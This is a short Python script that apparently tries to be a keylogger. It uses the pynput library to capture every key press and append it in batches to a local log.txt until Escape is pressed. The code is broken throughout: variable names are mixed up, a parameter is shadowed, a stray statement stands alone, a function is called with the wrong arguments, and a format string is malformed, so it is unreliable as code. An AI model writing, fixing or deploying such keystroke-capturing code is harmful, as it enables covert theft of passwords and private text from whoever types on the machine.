import pynput

from pynput.keyboard import Key, Listener

count = 0
key = []


def write_file():
    with open("log.txt","a") as f: 
            k = str(key).replace("'", "")
            key.space 
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("key") == -1:
                f.write(k)


def on_press(key):
    global keys ,count 
    key.append(key)
    count += 1
    print("[0] pressed ".format(key))


    if count >= 10:
        count = 0
        write_file(keys)
        keys =[] # after every 10 count the log will get updated 



def on_release(key):
    if key == key.esc:
        return False
# there would the function which will record when a key is pressed or releaesed 
with Listener(on_press = on_press ,on_release = on_release ) as listener :
    listener.join()